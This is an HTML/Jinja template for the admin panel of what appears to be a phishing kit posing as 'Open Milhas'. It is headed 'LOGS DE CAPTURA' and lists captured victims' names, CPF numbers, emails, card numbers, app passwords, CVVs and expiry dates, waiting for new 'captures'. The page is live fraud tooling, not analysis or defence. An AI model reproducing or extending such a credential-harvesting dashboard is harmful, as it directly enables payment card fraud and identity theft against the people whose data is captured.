<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel Administrativo | Open Milhas</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #1a1a1a; color: #fff; padding: 30px; }
        .table { background: #2d2d2d; color: #fff; border-radius: 10px; overflow: hidden; }
        .text-card { color: #00ff00; font-family: monospace; font-weight: bold; }
        .text-pass { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container-fluid">
        <h2 class="mb-4">LOGS DE CAPTURA - OPEN MILHAS</h2>
        <div class="table-responsive">
            <table class="table table-dark table-hover">
                <thead>
                    <tr>
                        <th>ID</th><th>Nome</th><th>CPF</th><th>Email</th>
                        <th>Número do Cartão</th><th>Senha App</th><th>CVV</th><th>Validade</th>
                    </tr>
                </thead>
                <tbody>
                    {% for u in usuarios %}
                    <tr>
                        <td>{{ u[0] }}</td><td>{{ u[1] }}</td><td>{{ u[2] }}</td><td>{{ u[3] }}</td>
                        <td class="text-card">{{ u[4] }}</td>
                        <td class="text-pass">{{ u[5] }}</td>
                        <td>{{ u[6] }}</td><td>{{ u[7] }}</td>
                    </tr>
                    {% else %}
                    <tr><td colspan="8" class="text-center">Aguardando capturas...</td></tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
